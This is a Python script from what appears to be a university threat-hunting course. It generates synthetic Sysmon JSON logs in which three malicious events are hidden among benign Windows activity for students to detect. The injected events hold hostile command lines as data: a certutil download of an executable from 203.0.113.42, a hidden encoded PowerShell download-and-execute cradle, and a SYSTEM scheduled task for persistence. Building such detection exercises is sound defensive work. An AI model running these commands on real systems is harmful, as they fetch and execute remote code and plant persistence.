#!/usr/bin/env python3
"""
generate_sysmon_dataset.py
==========================
Genera un dataset sintético de logs Sysmon (formato JSON) con:
- ~500 eventos benignos (procesos normales de Windows)
- 3 eventos maliciosos inyectados:
  1. certutil.exe descargando payload (T1105)
  2. PowerShell con comando encoded (T1059.001)
  3. Scheduled task sospechoso (T1053.005)

Curso MAR404 - Cacería de Amenazas - Clase 1
Universidad Mayor 2026
"""

import json
import random
import os
from datetime import datetime, timedelta

OUTPUT_FILE = "/data/sysmon_events.json"

# Procesos benignos típicos de Windows
BENIGN_PROCESSES = [
    {"Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM"},
    {"Image": "C:\\Windows\\System32\\lsass.exe", "ParentImage": "C:\\Windows\\System32\\wininit.exe", "User": "NT AUTHORITY\\SYSTEM"},
    {"Image": "C:\\Windows\\explorer.exe", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Windows\\System32\\taskhostw.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Windows\\System32\\SearchIndexer.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM"},
    {"Image": "C:\\Windows\\System32\\spoolsv.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM"},
    {"Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Windows\\System32\\conhost.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Windows\\System32\\dllhost.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "User": "WORKSTATION\\jsmith"},
    {"Image": "C:\\Windows\\System32\\WmiPrvSE.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "User": "NT AUTHORITY\\NETWORK SERVICE"},
    {"Image": "C:\\Windows\\System32\\msiexec.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM"},
    {"Image": "C:\\Windows\\System32\\dwm.exe", "ParentImage": "C:\\Windows\\System32\\winlogon.exe", "User": "Window Manager\\DWM-1"},
]

BENIGN_COMMANDLINES = [
    "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
    "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer",
    "C:\\Windows\\System32\\taskhostw.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
    "C:\\Windows\\System32\\SearchIndexer.exe /Embedding",
    "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
    "C:\\Windows\\System32\\conhost.exe 0x4",
    "C:\\Windows\\System32\\dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
]

# Eventos de red benignos (EventID 3)
BENIGN_NETWORK = [
    {"DestinationIp": "142.250.80.46", "DestinationPort": 443, "DestinationHostname": "www.google.com"},
    {"DestinationIp": "13.107.42.14", "DestinationPort": 443, "DestinationHostname": "outlook.office365.com"},
    {"DestinationIp": "151.101.1.69", "DestinationPort": 443, "DestinationHostname": "www.reddit.com"},
    {"DestinationIp": "104.16.132.229", "DestinationPort": 443, "DestinationHostname": "www.cloudflare.com"},
    {"DestinationIp": "192.168.1.1", "DestinationPort": 53, "DestinationHostname": "router.local"},
]


def generate_timestamp(base_time, offset_minutes):
    """Genera un timestamp ISO 8601."""
    ts = base_time + timedelta(minutes=offset_minutes, seconds=random.randint(0, 59))
    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def generate_benign_event(event_id, base_time, offset):
    """Genera un evento Sysmon benigno."""
    proc = random.choice(BENIGN_PROCESSES)
    
    if event_id == 1:  # Process Create
        return {
            "@timestamp": generate_timestamp(base_time, offset),
            "event": {"code": "1", "category": "process", "type": "start"},
            "host": {"name": "WORKSTATION-PC", "os": {"name": "Windows 10 Enterprise", "version": "10.0.19045"}},
            "process": {
                "name": os.path.basename(proc["Image"]),
                "executable": proc["Image"],
                "command_line": random.choice(BENIGN_COMMANDLINES),
                "pid": random.randint(1000, 65000),
                "parent": {"name": os.path.basename(proc["ParentImage"]), "executable": proc["ParentImage"]}
            },
            "user": {"name": proc["User"]},
            "winlog": {"event_id": 1, "provider_name": "Microsoft-Windows-Sysmon"}
        }
    elif event_id == 3:  # Network Connection
        net = random.choice(BENIGN_NETWORK)
        return {
            "@timestamp": generate_timestamp(base_time, offset),
            "event": {"code": "3", "category": "network", "type": "connection"},
            "host": {"name": "WORKSTATION-PC"},
            "process": {"name": os.path.basename(proc["Image"]), "executable": proc["Image"], "pid": random.randint(1000, 65000)},
            "source": {"ip": "192.168.1.105", "port": random.randint(49152, 65535)},
            "destination": {"ip": net["DestinationIp"], "port": net["DestinationPort"], "domain": net["DestinationHostname"]},
            "network": {"direction": "egress", "protocol": "tcp"},
            "user": {"name": proc["User"]},
            "winlog": {"event_id": 3, "provider_name": "Microsoft-Windows-Sysmon"}
        }
    elif event_id == 11:  # File Create
        return {
            "@timestamp": generate_timestamp(base_time, offset),
            "event": {"code": "11", "category": "file", "type": "creation"},
            "host": {"name": "WORKSTATION-PC"},
            "process": {"name": os.path.basename(proc["Image"]), "executable": proc["Image"]},
            "file": {"path": f"C:\\Users\\jsmith\\AppData\\Local\\Temp\\tmp{random.randint(1000,9999)}.tmp"},
            "user": {"name": proc["User"]},
            "winlog": {"event_id": 11, "provider_name": "Microsoft-Windows-Sysmon"}
        }


def generate_malicious_events(base_time):
    """Genera los 3 eventos maliciosos para el ejercicio de hunting."""
    events = []
    
    # === EVENTO MALICIOSO 1: certutil.exe download (T1105) ===
    events.append({
        "@timestamp": generate_timestamp(base_time, 47),
        "event": {"code": "1", "category": "process", "type": "start"},
        "host": {"name": "WORKSTATION-PC", "os": {"name": "Windows 10 Enterprise", "version": "10.0.19045"}},
        "process": {
            "name": "certutil.exe",
            "executable": "C:\\Windows\\System32\\certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://203.0.113.42/update.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe",
            "pid": 7842,
            "hash": {"sha256": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01"},
            "parent": {"name": "cmd.exe", "executable": "C:\\Windows\\System32\\cmd.exe", "pid": 5124}
        },
        "user": {"name": "WORKSTATION\\jsmith"},
        "winlog": {"event_id": 1, "provider_name": "Microsoft-Windows-Sysmon"},
        "threat": {"technique": {"id": "T1105", "name": "Ingress Tool Transfer"}}
    })
    
    # === EVENTO MALICIOSO 2: PowerShell encoded command (T1059.001) ===
    # El comando encoded decodifica a: IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.42/beacon.ps1')
    encoded_cmd = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAAyAC8AYgBlAGEAYwBvAG4ALgBwAHMAMQAnACkA"
    events.append({
        "@timestamp": generate_timestamp(base_time, 52),
        "event": {"code": "1", "category": "process", "type": "start"},
        "host": {"name": "WORKSTATION-PC", "os": {"name": "Windows 10 Enterprise", "version": "10.0.19045"}},
        "process": {
            "name": "powershell.exe",
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_cmd}",
            "pid": 9216,
            "parent": {"name": "svchost.exe", "executable": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe", "pid": 8844}
        },
        "user": {"name": "WORKSTATION\\jsmith"},
        "winlog": {"event_id": 1, "provider_name": "Microsoft-Windows-Sysmon"},
        "threat": {"technique": {"id": "T1059.001", "name": "PowerShell"}}
    })
    
    # === EVENTO MALICIOSO 3: Scheduled Task creation (T1053.005) ===
    events.append({
        "@timestamp": generate_timestamp(base_time, 55),
        "event": {"code": "1", "category": "process", "type": "start"},
        "host": {"name": "WORKSTATION-PC", "os": {"name": "Windows 10 Enterprise", "version": "10.0.19045"}},
        "process": {
            "name": "schtasks.exe",
            "executable": "C:\\Windows\\System32\\schtasks.exe",
            "command_line": "schtasks /create /tn \"WindowsUpdateCheck\" /tr \"C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe\" /sc minute /mo 15 /ru SYSTEM",
            "pid": 10432,
            "parent": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 9216}
        },
        "user": {"name": "WORKSTATION\\jsmith"},
        "winlog": {"event_id": 1, "provider_name": "Microsoft-Windows-Sysmon"},
        "threat": {"technique": {"id": "T1053.005", "name": "Scheduled Task"}}
    })
    
    return events


def main():
    """Genera el dataset completo."""
    os.makedirs("/data", exist_ok=True)
    
    base_time = datetime(2026, 1, 15, 8, 0, 0)
    events = []
    
    # Generar ~500 eventos benignos distribuidos en 8 horas
    for i in range(500):
        event_id = random.choice([1, 1, 1, 3, 3, 11])  # Más eventos de proceso
        offset = random.randint(0, 480)  # 8 horas en minutos
        event = generate_benign_event(event_id, base_time, offset)
        if event:
            events.append(event)
    
    # Inyectar eventos maliciosos
    malicious = generate_malicious_events(base_time)
    events.extend(malicious)
    
    # Ordenar por timestamp
    events.sort(key=lambda x: x["@timestamp"])
    
    # Escribir a archivo
    with open(OUTPUT_FILE, 'w') as f:
        for event in events:
            f.write(json.dumps(event) + '\n')
    
    print(f"[+] Dataset generado: {len(events)} eventos ({len(events)-3} benignos + 3 maliciosos)")
    print(f"[+] Archivo: {OUTPUT_FILE}")
    print(f"[+] Eventos maliciosos inyectados:")
    print(f"    - certutil.exe download (T1105) @ offset +47min")
    print(f"    - PowerShell encoded (T1059.001) @ offset +52min")
    print(f"    - Scheduled Task (T1053.005) @ offset +55min")


if __name__ == "__main__":
    main()
